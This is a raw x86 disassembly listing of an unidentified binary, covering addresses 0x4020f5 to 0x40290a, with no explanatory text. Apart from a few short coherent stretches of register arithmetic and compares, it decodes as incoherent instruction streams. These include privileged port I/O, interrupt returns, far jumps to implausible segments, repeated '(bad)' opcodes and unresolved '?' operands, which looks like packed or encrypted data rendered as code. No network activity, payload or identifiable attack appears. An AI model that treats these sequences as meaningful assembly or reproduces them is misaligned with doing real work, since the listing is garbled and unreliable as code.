  4020f5:	mov    dh,0x64
  4020f7:	enter  0x8b2,0x3f
  4020fb:	xchg   ebx,eax
  4020fc:	add    al,0xa7
  4020fe:	lods   al,BYTE PTR ds:[esi]
  4020ff:	pop    ebx
  402100:	out    dx,eax
  402101:	loope  0x402109
  402103:	fwait
  402104:	mov    ebp,0xd7062bee
  402109:	out    dx,al
  40210a:	aaa    
  40210b:	cdq    
  40210c:	push   es
  40210d:	jmp    0x93072d85
  402112:	adc    bl,ah
  402114:	ret    0x8540
  402117:	xlat   BYTE PTR ds:[ebx]
  402118:	gs jmp 0x79c20673
  40211e:	dec    ecx
  40211f:	mov    al,0xaf
  402121:	outs   dx,BYTE PTR ss:[esi]
  402123:	add    eax,0x72afb4ea
  402128:	mov    edi,0x1767a97f
  40212d:	xlat   BYTE PTR ds:[ebx]
  40212e:	inc    eax
  40212f:	inc    esp
  402130:	cs mov cs,edi
  402133:	sbb    al,0xe2
  402135:	iret   
  402136:	fsub   DWORD PTR [ebx+eiz*2+0x4f]
  40213a:	data16 (bad) 
  40213c:	push   esp
  40213d:	push   ebp
  40213e:	out    0xfc,al
  402140:	mov    ds:0x520e297b,eax
  402145:	jmp    0xcd9af77d
  40214a:	lock jb 0x4021a3
  40214d:	aaa    
  40214e:	add    BYTE PTR [edx-0xf],bh
  402151:	loopne 0x402110
  402153:	sub    al,BYTE PTR [eax-0x7a]
  402156:	or     DWORD PTR [ebx+0x11],esi
  402159:	pop    ss
  40215a:	mov    ds:0xd3fddf84,al
  40215f:	add    ecx,eax
  402161:	jmp    0xab49a871
  402166:	pop    ecx
  402167:	push   ecx
  402168:	ret    
  402169:	mov    esi,0xd905e802
  40216e:	out    0x55,eax
  402170:	lods   eax,DWORD PTR ds:[esi]
  402171:	daa    
  402172:	xchg   edi,eax
  402173:	adc    eax,0x2745ef73
  402178:	and    DWORD PTR [eax],edx
  40217a:	sub    DWORD PTR [ecx-0x39],esp
  40217d:	enter  0xcdb1,0xf8
  402181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402182:	lahf   
  402183:	pop    edi
  402184:	sub    BYTE PTR [ebx],al
  402186:	bound  esp,QWORD PTR [eax-0x30]
  402189:	das    
  40218a:	xchg   esp,eax
  40218b:	adc    esi,DWORD PTR [eax-0x7e]
  40218e:	mov    ah,0x6d
  402190:	leave  
  402191:	push   edx
  402192:	in     eax,0xf5
  402194:	push   0x32
  402196:	xchg   esp,eax
  402197:	xor    al,0xb6
  402199:	je     0x4021ca
  40219b:	or     al,0xff
  40219d:	jo     0x402146
  40219f:	enter  0x2073,0xc4
  4021a3:	jmp    0x126626e
  4021a8:	fisttp DWORD PTR [edx]
  4021aa:	in     al,0x95
  4021ac:	dec    ecx
  4021ad:	jp     0x402220
  4021af:	aaa    
  4021b0:	call   0x32f7:0x9b5db7e1
  4021b7:	and    BYTE PTR [eax],bh
  4021b9:	repz pop ecx
  4021bb:	out    0x3,eax
  4021bd:	jg     0x402218
  4021bf:	popa   
  4021c0:	dec    eax
  4021c1:	fs dec ebx
  4021c3:	jmp    0x1136:0xbb880518
  4021ca:	add    al,0x85
  4021cc:	sbb    BYTE PTR [ebp+0x69],bl
  4021cf:	shl    DWORD PTR [ebx],cl
  4021d1:	sub    al,0x80
  4021d3:	bound  ebp,QWORD PTR [ebp+0x28]
  4021d6:	xchg   ebx,eax
  4021d7:	repnz sub al,0x4a
  4021da:	sbb    eax,0xac88f489
  4021df:	sar    DWORD PTR [ebx+0x9],0xbd
  4021e3:	adc    eax,0x5059634f
  4021e8:	pop    edi
  4021e9:	icebp  
  4021ea:	dec    esp
  4021eb:	sahf   
  4021ec:	add    esi,edx
  4021ee:	loopne 0x4021ba
  4021f0:	mov    ebp,0xa57820b9
  4021f5:	fdiv   DWORD PTR [esp+ebp*1+0x2139057c]
  4021fc:	xchg   edi,eax
  4021fd:	cld    
  4021fe:	inc    edi
  4021ff:	sub    al,BYTE PTR [ebp+0x3a]
  402202:	push   ds
  402203:	mov    cl,0x56
  402205:	imul   BYTE PTR [edi+edx*4+0x4e]
  402209:	add    ecx,DWORD PTR [eax+0x207190ef]
  40220f:	adc    dl,bl
  402211:	inc    esp
  402212:	push   ebx
  402213:	cld    
  402214:	and    edx,DWORD PTR [edx-0x11]
  402217:	pop    ebp
  402218:	adc    al,BYTE PTR [ecx+0x53]
  40221b:	ret    0x3796
  40221e:	(bad)  
  40221f:	and    esp,DWORD PTR [esp+ebx*2-0x12]
  402223:	cmp    ecx,DWORD PTR [ebx]
  402225:	or     BYTE PTR [ebx],ch
  402227:	sar    eax,cl
  402229:	cmp    edx,DWORD PTR [eax+0x5c82c6ae]
  40222f:	xchg   esi,eax
  402230:	mov    edi,ebp
  402232:	fcom   DWORD PTR [ebx-0x4c88bd0b]
  402238:	pop    edx
  402239:	lods   al,BYTE PTR ds:[esi]
  40223a:	and    eax,0x9b0229a5
  40223f:	je     0x4022a9
  402241:	dec    edx
  402242:	or     eax,0x36a340fd
  402247:	sub    eax,0xca9ff875
  40224c:	fld    TBYTE PTR [esp+edi*2-0x75]
  402250:	dec    ebp
  402251:	or     al,0x33
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi-0x5010b53],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402248
  4022a2:	push   0xffffffc0
  4022a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a5:	sti    
  4022a6:	mov    WORD PTR [esp+edi*4+0x3d],ss
  4022aa:	pop    ebx
  4022ab:	(bad)  
  4022ac:	out    dx,al
  4022ad:	sbb    cl,bl
  4022af:	push   ss
  4022b0:	sar    DWORD PTR [edi-0x4a],1
  4022b3:	aaa    
  4022b4:	repnz mov bh,0x51
  4022b7:	push   ds
  4022b8:	add    BYTE PTR [edi+0x2b95d108],0xc5
  4022bf:	outs   dx,BYTE PTR ds:[esi]
  4022c0:	mov    bl,0xc5
  4022c2:	and    BYTE PTR [eax],bh
  4022c4:	lahf   
  4022c5:	sbb    BYTE PTR [esi-0x385c18c],bh
  4022cb:	cli    
  4022cc:	xchg   DWORD PTR [esi-0x67],ecx
  4022cf:	pop    es
  4022d0:	mov    ebp,0x78f216ed
  4022d5:	data16 fxch st(1)
  4022d8:	adc    eax,0x9d04868b
  4022dd:	and    esp,eax
  4022df:	mov    DWORD PTR [ebx+0x28],esp
  4022e2:	dec    ebp
  4022e3:	sbb    al,0x4
  4022e5:	pop    ecx
  4022e6:	dec    esi
  4022e7:	test   esp,esi
  4022e9:	sti    
  4022ea:	fsubr  QWORD PTR [eax-0x1c]
  4022ed:	shl    BYTE PTR [eax+eax*2+0x6a25bf2f],1
  4022f4:	adc    al,0x20
  4022f6:	and    eax,0x120a1527
  4022fb:	test   eax,0xd0ab6bb5
  402300:	jbe    0x40235f
  402302:	and    DWORD PTR [ebp+0x482f5bfc],0xb75122ca
  40230c:	xor    eax,0xc21e7c39
  402311:	add    DWORD PTR [ebp+0x2518450f],esi
  402317:	fadd   st(2),st
  402319:	std    
  40231a:	mov    al,0xb7
  40231c:	out    dx,eax
  40231d:	xor    ecx,esp
  40231f:	dec    ebx
  402320:	es and ebp,esi
  402323:	pop    ss
  402324:	or     al,0x59
  402326:	enter  0xf4fe,0x97
  40232a:	lds    edi,FWORD PTR [eax+esi*2]
  40232d:	lahf   
  40232e:	ret    
  40232f:	sbb    ecx,DWORD PTR [edx+0x4cf56f80]
  402335:	push   es
  402336:	add    eax,0x71098640
  40233b:	sub    dl,BYTE PTR [edx+ebp*2+0x4131eab6]
  402342:	sbb    BYTE PTR [eax-0x1aabf0f1],ah
  402348:	pop    DWORD PTR [edx-0x6d]
  40234b:	stc    
  40234c:	clc    
  40234d:	xor    edi,DWORD PTR [ecx-0x2093ebf5]
  402353:	mov    ecx,0x18cf343c
  402358:	addr16 out 0x2f,eax
  40235b:	and    bh,dh
  40235d:	fld    DWORD PTR [edx]
  40235f:	(bad)  
  402361:	jge    0x402361
  402363:	int    0xb6
  402365:	mov    eax,ds:0x75c523e2
  40236a:	shl    esi,cl
  40236c:	mov    ebx,ecx
  40236e:	rcl    DWORD PTR [eax],cl
  402370:	(bad)  
  402371:	xchg   ebx,eax
  402372:	gs xchg ecx,eax
  402374:	jge    0x402361
  402376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402377:	jae    0x4023f0
  402379:	neg    esp
  40237b:	neg    BYTE PTR [ebp-0x67]
  40237e:	neg    ebp
  402380:	xchg   esi,eax
  402381:	cmc    
  402382:	fwait
  402383:	jb     0x4023d5
  402385:	push   cs
  402386:	push   ds
  402387:	ja     0x402394
  402389:	mov    al,0x49
  40238b:	mov    al,BYTE PTR [edx-0x758b8e35]
  402391:	mov    esi,0xddbd8363
  402396:	mov    edx,0x2e128883
  40239b:	cmc    
  40239c:	sub    al,0x59
  40239e:	rcr    BYTE PTR [edx],cl
  4023a0:	sub    bh,BYTE PTR ds:0x7656d333
  4023a6:	fpatan 
  4023a8:	cmp    BYTE PTR [eax-0x70ea7451],bh
  4023ae:	enter  0xe966,0x2c
  4023b2:	sub    edx,0x383f1f88
  4023b8:	je     0x40233b
  4023ba:	ins    DWORD PTR es:[edi],dx
  4023bb:	xchg   ebp,eax
  4023bc:	jge    0x4023bd
  4023be:	push   ebx
  4023bf:	loop   0x402420
  4023c1:	xor    BYTE PTR [ebx+0x46],ch
  4023c4:	pushf  
  4023c5:	adc    eax,0x4aa89734
  4023ca:	add    esp,DWORD PTR [edi+0x16]
  4023cd:	iret   
  4023ce:	inc    edi
  4023cf:	mov    ah,0x38
  4023d1:	mov    ds:0x3e77c2e3,eax
  4023d6:	cmc    
  4023d7:	inc    edx
  4023d8:	mov    bl,BYTE PTR [ecx-0x38aa677d]
  4023de:	iret   
  4023df:	adc    eax,0x874feef3
  4023e4:	arpl   si,dx
  4023e6:	pop    ebp
  4023e7:	ret    
  4023e8:	xchg   ebp,eax
  4023e9:	lods   eax,DWORD PTR ds:[esi]
  4023ea:	mov    ds:0xae7460ee,al
  4023ef:	cmp    eax,0x63375494
  4023f4:	push   ebx
  4023f5:	loopne 0x40242e
  4023f7:	jmp    0x5d82:0xed33f2b4
  4023fe:	xor    al,0xc6
  402400:	push   0x7f0e5495
  402405:	fnstsw WORD PTR [ecx+0x5d]
  402408:	pop    eax
  402409:	outs   dx,DWORD PTR ds:[esi]
  40240a:	ins    DWORD PTR es:[edi],dx
  40240b:	mov    edx,0x636a9495
  402410:	pop    ss
  402411:	pusha  
  402412:	xchg   BYTE PTR [esi],ch
  402414:	(bad)  
  402415:	push   ss
  402416:	les    eax,FWORD PTR [ebx-0x17]
  402419:	xchg   dl,ah
  40241b:	and    BYTE PTR [edx-0x25eb4869],cl
  402421:	lods   al,BYTE PTR ds:[esi]
  402422:	aaa    
  402423:	imul   esi,DWORD PTR [edi+0x78],0x3b
  402427:	stos   DWORD PTR es:[edi],eax
  402428:	je     0x4023cf
  40242a:	iretw  
  40242c:	fdiv   QWORD PTR [eax+0x75017d46]
  402432:	int    0x3f
  402434:	cli    
  402435:	shr    edi,0x47
  402438:	jo     0x402407
  40243a:	mov    ds:0xfcc30686,al
  40243f:	mov    ch,0x58
  402441:	not    ebp
  402443:	addr16 imul edi,esi,0xd900b22c
  40244a:	pop    edi
  40244b:	sub    edx,DWORD PTR [ecx+0x356ce7ca]
  402451:	imul   edi,DWORD PTR [edi],0x85a2f974
  402457:	mov    al,0x80
  402459:	loope  0x402464
  40245b:	jae    0x40242e
  40245d:	retf   0x71d5
  402460:	aam    0x2
  402462:	pop    ebx
  402463:	push   edi
  402464:	leave  
  402465:	aad    0x83
  402467:	mov    al,0xec
  402469:	adc    eax,0xa1f6ed13
  40246e:	cmp    DWORD PTR [eax],eax
  402470:	out    dx,eax
  402471:	cmp    eax,0xda193d90
  402476:	inc    eax
  402477:	push   cs
  402478:	addr16 xor al,0x41
  40247b:	mov    ebx,0x5f38c19a
  402480:	jg     0x4024cc
  402482:	bnd jo 0x40241e
  402485:	xlat   BYTE PTR ds:[ebx]
  402486:	loope  0x402474
  402488:	sbb    al,BYTE PTR [edx-0x72]
  40248b:	test   al,0x85
  40248d:	ret    
  40248e:	(bad)  
  40248f:	push   edx
  402490:	fidiv  WORD PTR [ebx]
  402492:	sti    
  402493:	xor    eax,0xc40960c7
  402498:	adc    al,0xbd
  40249a:	rcl    DWORD PTR [ebx-0x7335f8dc],1
  4024a0:	mov    DWORD PTR [ebx+eax*4-0x67aad040],edi
  4024a7:	addr16 (bad) 
  4024a9:	sbb    bh,BYTE PTR [ebx+ebx*8-0x6e]
  4024ad:	jns    0x402504
  4024af:	nop
  4024b0:	jnp    0x402517
  4024b2:	(bad)  
  4024b3:	stc    
  4024b4:	cmp    eax,DWORD PTR [ecx]
  4024b6:	push   edx
  4024b7:	mov    eax,ds:0xce6c916c
  4024bc:	(bad)  
  4024bd:	add    DWORD PTR [edx+0x56],eax
  4024c0:	mov    ah,0x95
  4024c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c3:	adc    ch,dl
  4024c5:	push   ecx
  4024c6:	inc    ecx
  4024c7:	jmp    ebx
  4024c9:	push   edi
  4024ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024cb:	movsx  edx,WORD PTR [ecx-0x54]
  4024cf:	int    0x71
  4024d1:	sub    al,0xef
  4024d3:	jmp    0x4024de
  4024d5:	jp     0x402504
  4024d7:	enter  0x6388,0xae
  4024db:	and    ebp,ebx
  4024dd:	pop    esi
  4024de:	add    al,0x2b
  4024e0:	vpcmpeqd xmm3,xmm0,XMMWORD PTR ss:[eax+0x28f02481]
  4024e9:	and    bh,BYTE PTR [ebx]
  4024eb:	xor    eax,0xefd7a4b2
  4024f0:	inc    edi
  4024f1:	xchg   esi,eax
  4024f2:	sub    ch,BYTE PTR [ebx-0x7d533db0]
  4024f8:	adc    BYTE PTR [edx],cl
  4024fa:	push   ebp
  4024fb:	test   ebx,eax
  4024fd:	pop    edi
  4024fe:	and    dh,BYTE PTR [edx]
  402500:	push   0xffffff9e
  402502:	pop    ds
  402503:	adc    BYTE PTR [esi+0x15],ch
  402506:	cmp    eax,0x9a4f073b
  40250b:	mov    esi,0x25cca79c
  402510:	enter  0x34f7,0xce
  402514:	(bad)  
  402515:	ret    
  402516:	pop    ecx
  402517:	out    0x84,eax
  402519:	rcl    DWORD PTR [edi-0x6da5b367],cl
  40251f:	les    eax,FWORD PTR [ebx+0x75e3e63a]
  402525:	or     al,BYTE PTR [ebx-0x76236be4]
  40252b:	or     esi,DWORD PTR [eax+edi*2+0x66]
  40252f:	mov    ebx,0xc42d0bbd
  402534:	call   0xcbd8:0x12e547f5
  40253b:	fdivr  DWORD PTR [ebx+0xf]
  40253e:	push   esi
  40253f:	retf   
  402540:	jns    0x402546
  402542:	aas    
  402543:	hlt    
  402544:	xor    BYTE PTR [eax],cl
  402546:	xlat   BYTE PTR ds:[ebx]
  402547:	or     al,0x82
  402549:	mov    eax,0xc4ca11d4
  40254e:	adc    BYTE PTR [ecx],ch
  402550:	je     0x4025b6
  402552:	(bad)  
  402553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402554:	push   eax
  402555:	jle    0x402535
  402557:	mov    esi,0xbf2195c4
  40255c:	sysret 
  40255e:	push   cs
  40255f:	mov    gs,edi
  402561:	add    ebx,DWORD PTR [ecx]
  402563:	ffreep st(5)
  402565:	and    BYTE PTR [ebp+0x6eee5e6],ch
  40256b:	add    eax,0x5ce2efcb
  402570:	cmp    eax,0x4149c7ce
  402575:	jle    0x4025a8
  402577:	clc    
  402578:	inc    BYTE PTR [esi+0x2e]
  40257b:	inc    esp
  40257c:	mov    al,ds:0x4924991
  402581:	mov    dh,0x10
  402583:	std    
  402584:	es into 
  402586:	pop    ss
  402587:	mov    ah,0x6c
  402589:	div    DWORD PTR [ebx]
  40258b:	(bad)  
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	pop    esp
  4025ae:	xchg   dl,cl
  4025b0:	push   ebx
  4025b1:	jmp    0x7c7e:0x677c7c0f
  4025b8:	jl     0x4025a6
  4025ba:	mov    cl,0xa0
  4025bc:	jmp    0xe85:0x6c098e55
  4025c3:	sub    al,0xf1
  4025c5:	stos   BYTE PTR es:[edi],al
  4025c6:	ins    BYTE PTR es:[edi],dx
  4025c7:	outs   dx,BYTE PTR ds:[esi]
  4025c8:	mov    esp,0x85f6801a
  4025cd:	inc    ebp
  4025ce:	cdq    
  4025cf:	push   0x73
  4025d1:	pop    esi
  4025d2:	leave  
  4025d3:	xor    eax,0xad494b33
  4025d8:	pop    edx
  4025d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025da:	adc    ebp,ecx
  4025dc:	mov    WORD PTR ds:0x8b56d9a8,gs
  4025e2:	sub    DWORD PTR [ecx+ecx*2],edx
  4025e5:	nop
  4025e6:	inc    ebp
  4025e7:	inc    esi
  4025e8:	sbb    eax,0x41b8986d
  4025ed:	jbe    0x402601
  4025ef:	fild   WORD PTR [edi-0x3efca37b]
  4025f6:	inc    esp
  4025f7:	loope  0x402593
  4025f9:	(bad)  [ebp+edx*2+0x4f]
  4025fd:	ins    BYTE PTR es:[edi],dx
  4025fe:	pop    cx
  402600:	and    eax,0xa89c966
  402605:	cmp    dl,0x5b
  402608:	cmp    dh,BYTE PTR [ebp-0x58]
  40260b:	adc    ch,BYTE PTR [ebp+0x7c435065]
  402611:	aad    0x7a
  402613:	mov    al,BYTE PTR ds:0x38d0a44c
  402619:	or     eax,0x471ef578
  40261e:	jge    0x402630
  402620:	aad    0x69
  402622:	stc    
  402623:	loopne 0x4025fa
  402625:	loopne 0x40262d
  402627:	and    bl,BYTE PTR [ecx]
  402629:	mov    ch,0x5c
  40262b:	daa    
  40262c:	sar    DWORD PTR [edx+0x70726514],cl
  402632:	add    ch,BYTE PTR [esp+ecx*8+0x5f]
  402636:	std    
  402637:	add    ah,bh
  402639:	sahf   
  40263a:	in     al,0xaa
  40263c:	bound  eax,QWORD PTR [edx]
  40263e:	ds xor eax,0x76429173
  402644:	push   ss
  402645:	outs   dx,DWORD PTR ds:[esi]
  402646:	fild   DWORD PTR [eax+0x42]
  402649:	dec    edx
  40264a:	test   ch,bh
  40264c:	xor    eax,0xe090df0e
  402651:	es pushf 
  402653:	cld    
  402654:	lds    ebp,FWORD PTR [ebp+0x41]
  402657:	imul   ebx,ebx,0x96072efe
  40265d:	pop    ebx
  40265e:	adc    ch,ah
  402660:	push   edx
  402661:	scas   al,BYTE PTR es:[edi]
  402662:	pop    ebx
  402663:	mov    ?,ebp
  402665:	mov    al,ds:0x8561da62
  40266a:	jg     0x402636
  40266c:	into   
  40266d:	jle    0x402632
  40266f:	xchg   edi,eax
  402670:	xlat   BYTE PTR ds:[ebx]
  402671:	(bad)  
  402672:	jecxz  0x4025f9
  402674:	push   ebp
  402675:	add    ecx,edx
  402677:	sbb    al,0x65
  402679:	add    BYTE PTR [ebx-0x24],dh
  40267c:	pop    ebx
  40267d:	call   0xf65f:0xe7453164
  402684:	pop    ebx
  402685:	cli    
  402686:	inc    ebp
  402687:	pop    edx
  402688:	test   DWORD PTR [edx-0x80],ecx
  40268b:	sbb    edi,esp
  40268d:	fs push ecx
  40268f:	xor    ch,bl
  402691:	push   edi
  402692:	inc    edi
  402693:	mov    WORD PTR [edx+0x3c],?
  402696:	sub    DWORD PTR [ecx-0x4b],ebx
  402699:	ror    ah,0x19
  40269c:	xlat   BYTE PTR ds:[ebx]
  40269d:	(bad)
  4026a1:	xchg   ebp,eax
  4026a2:	pop    eax
  4026a3:	retf   0x86a6
  4026a6:	push   es
  4026a7:	addr16 add eax,0x22cbde8d
  4026ad:	mov    edx,0x922ea848
  4026b2:	out    0x20,eax
  4026b4:	and    DWORD PTR [ebx+0x19276c],0x93bc8aea
  4026be:	and    BYTE PTR [esi+0x45],ah
  4026c1:	or     bh,bh
  4026c3:	sub    DWORD PTR [ebx],eax
  4026c5:	or     al,0x9f
  4026c7:	int    0x80
  4026c9:	inc    edx
  4026ca:	pop    esi
  4026cb:	in     eax,0xd3
  4026cd:	and    al,0x2d
  4026cf:	test   al,0xf8
  4026d1:	sbb    eax,0x3b60c397
  4026d6:	call   0x9e04fe04
  4026db:	mov    al,0xde
  4026dd:	and    ecx,edi
  4026df:	xchg   esp,eax
  4026e0:	ret    0xd620
  4026e3:	outs   dx,BYTE PTR ds:[esi]
  4026e4:	fisub  WORD PTR [eax-0x5fb18a07]
  4026ea:	out    0xf4,eax
  4026ec:	mov    edx,0x22872ea6
  4026f1:	mov    ch,0x4f
  4026f3:	push   0x7fc6da89
  4026f8:	into   
  4026f9:	jecxz  0x40274e
  4026fb:	sbb    al,0xe1
  4026fd:	out    dx,al
  4026fe:	fwait
  4026ff:	inc    eax
  402700:	push   ss
  402701:	xor    eax,0x48ba3a44
  402706:	adc    dh,BYTE PTR [edi+0x5e731f7a]
  40270c:	in     al,0x38
  40270e:	je     0x402763
  402710:	dec    eax
  402711:	push   es
  402712:	jl     0x402698
  402714:	xor    eax,0xc6f0276d
  402719:	bound  ebx,QWORD PTR [ebx-0x4c]
  40271c:	pop    edx
  40271d:	push   0xf88d51c1
  402722:	nop
  402723:	(bad)  
  402724:	(bad)  [edx-0x52]
  402727:	mov    al,0x55
  402729:	push   ecx
  40272a:	(bad)  
  40272b:	mov    al,0x91
  40272d:	outs   dx,DWORD PTR ds:[esi]
  40272e:	push   es
  40272f:	fimul  DWORD PTR [ebx+0x22]
  402732:	ret    
  402733:	sbb    dh,ah
  402735:	and    eax,DWORD PTR [ebx]
  402737:	inc    esp
  402738:	push   eax
  402739:	sub    al,BYTE PTR [edi-0x7c]
  40273c:	xor    ecx,DWORD PTR [edx+0x326b8585]
  402742:	ficomp DWORD PTR [ebp-0x50]
  402745:	call   0x29709e5f
  40274a:	cmp    eax,esp
  40274c:	mov    edi,0xb31b4079
  402751:	pop    ecx
  402752:	jnp    0x402779
  402754:	ds cs cld 
  402757:	dec    ebp
  402758:	mov    al,ds:0x1578a3c7
  40275d:	jb     0x4026f3
  40275f:	add    eax,ebx
  402761:	sti    
  402762:	push   ss
  402763:	out    dx,al
  402764:	aad    0xf
  402766:	xor    ecx,DWORD PTR [edx]
  402768:	jp     0x4027d3
  40276a:	and    al,BYTE PTR [esi+0x618bf24]
  402770:	ret    
  402771:	sti    
  402772:	dec    ebx
  402773:	sub    al,0x88
  402775:	push   edi
  402776:	jae    0x402769
  402778:	mov    ah,0xbc
  40277a:	mov    esi,0xcaed337e
  40277f:	cwde   
  402780:	sub    DWORD PTR [ecx],0x14aff285
  402786:	adc    BYTE PTR [eax],dl
  402788:	lahf   
  402789:	frstor [edi]
  40278b:	and    BYTE PTR ds:0xe36de945,bh
  402791:	cli    
  402792:	retf   
  402793:	lods   eax,DWORD PTR ds:[esi]
  402794:	arpl   WORD PTR [ebx-0x67396ba8],ax
  40279a:	repz xor ch,BYTE PTR [ecx+0x6f]
  40279e:	pop    esi
  40279f:	stc    
  4027a0:	mov    ecx,0x506529aa
  4027a5:	fimul  DWORD PTR [edx+0x1d]
  4027a8:	cmp    BYTE PTR [ecx+0x4b],bl
  4027ab:	cwde   
  4027ac:	push   edi
  4027ad:	retf   
  4027ae:	cli    
  4027af:	sub    eax,DWORD PTR [ecx-0x2e]
  4027b2:	dec    ebx
  4027b3:	jmp    0x4027fe
  4027b5:	loope  0x4027a8
  4027b7:	sbb    BYTE PTR [esi+0x79],al
  4027ba:	push   cs
  4027bb:	inc    ebx
  4027bc:	xchg   esi,eax
  4027bd:	inc    ebp
  4027be:	das    
  4027bf:	cmp    BYTE PTR [eax-0x106709c2],ch
  4027c5:	pushf  
  4027c6:	sbb    bl,BYTE PTR [ebp+0x63]
  4027c9:	cmc    
  4027ca:	add    bh,bh
  4027cc:	nop
  4027cd:	icebp  
  4027ce:	push   edx
  4027cf:	arpl   WORD PTR [ecx-0x371bc864],bx
  4027d5:	sub    bh,BYTE PTR [ebx-0x3e]
  4027d8:	and    al,0x6c
  4027da:	(bad)  
  4027db:	hlt    
  4027dc:	dec    eax
  4027dd:	loopne 0x40278a
  4027df:	sti    
  4027e0:	mov    eax,DWORD PTR [ecx+0x5698457a]
  4027e6:	or     ch,BYTE PTR [edi+0x14]
  4027e9:	(bad)  
  4027ea:	sbb    DWORD PTR ds:0xe192444e,esi
  4027f0:	and    eax,0x2c8ab91f
  4027f5:	jo     0x4027fe
  4027f7:	mov    ds:0xedd64e8e,eax
  4027fc:	sub    ebx,0xffffffbb
  4027ff:	js     0x4027d0
  402801:	jno    0x402866
  402803:	jns    0x4027ed
  402805:	cmc    
  402806:	push   ds
  402807:	fbld   TBYTE PTR [ebx]
  402809:	inc    eax
  40280a:	lds    edx,FWORD PTR [ebp+0xd]
  40280d:	sub    eax,0xa1b4b037
  402812:	xlat   BYTE PTR ds:[ebx]
  402813:	jne    0x402828
  402815:	loopne 0x402833
  402817:	test   eax,0x2acc24f4
  40281c:	popf   
  40281d:	mov    edi,?
  40281f:	adc    DWORD PTR [edx],esp
  402821:	in     al,0xe8
  402823:	jb     0x402818
  402825:	scas   al,BYTE PTR es:[edi]
  402826:	push   ebx
  402827:	test   DWORD PTR [esi+0x2f4de325],0x6458e041
  402831:	mov    esi,DWORD PTR [edx-0x29]
  402834:	dec    ebp
  402835:	lea    ecx,[edi+0x3e555a3e]
  40283b:	pop    ebp
  40283c:	xchg   ecx,eax
  40283d:	sub    ebp,DWORD PTR [esi+0x151eadcf]
  402843:	ror    DWORD PTR [ecx+0x58],1
  402846:	mov    edx,0x7d5fe2ed
  40284b:	ins    BYTE PTR es:[edi],dx
  40284c:	pop    edi
  40284d:	add    DWORD PTR [ecx-0x66],edi
  402850:	imul   ebp,eax,0xd8a5b57a
  402856:	push   ecx
  402857:	cld    
  402858:	sub    eax,0xcd85e63c
  40285d:	add    DWORD PTR [eax],edx
  40285f:	sti    
  402860:	sub    BYTE PTR [esi],bl
  402862:	pop    ecx
  402863:	ss cs xor al,0x9c
  402867:	sbb    eax,0xacd00b
  40286c:	mov    ah,BYTE PTR [edi]
  40286e:	jno    0x4028bf
  402870:	inc    eax
  402871:	or     al,0x2b
  402873:	outs   dx,DWORD PTR ds:[esi]
  402874:	sahf   
  402875:	shl    BYTE PTR [ecx+ecx*8+0x7d],cl
  402879:	cwde   
  40287a:	xchg   edx,eax
  40287c:	pop    edx
  40287d:	sar    eax,0x4
  402880:	add    DWORD PTR [eax-0xa],eax
  402883:	add    al,0xaf
  402885:	nop
  402886:	out    0x5e,al
  402888:	cwde   
  402889:	add    ecx,edx
  40288b:	test   BYTE PTR [ebp+0x7d],0xb0
  40288f:	aas    
  402890:	xor    eax,0x3a3106cc
  402895:	add    BYTE PTR [ebp-0x16d1823a],ah
  40289b:	sbb    ebx,DWORD PTR ds:0x99466580
  4028a1:	sbb    cl,BYTE PTR [edi]
  4028a3:	test   BYTE PTR [esi],cl
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [ebx+0xc7f845],cl
  4028ad:	lea    ebx,[esi]
  4028af:	xor    al,0x60
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	sub    edi,ebp
  4028e3:	neg    DWORD PTR [eax+0x7c7c08dd]
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x402873
  4028ee:	stc    
  4028ef:	add    al,0x27
  4028f1:	les    ebx,FWORD PTR [ecx-0x36f2904b]
  4028f7:	aam    0x1d
  4028f9:	jb     0x4028fe
  4028fb:	and    DWORD PTR [edx-0x68],0x39797cef
  402902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402903:	pop    ss
  402904:	test   BYTE PTR [edx-0x3e],dl
  402907:	dec    edi
  402908:	add    DWORD PTR [eax],eax
  40290a:	retf   0x7dce
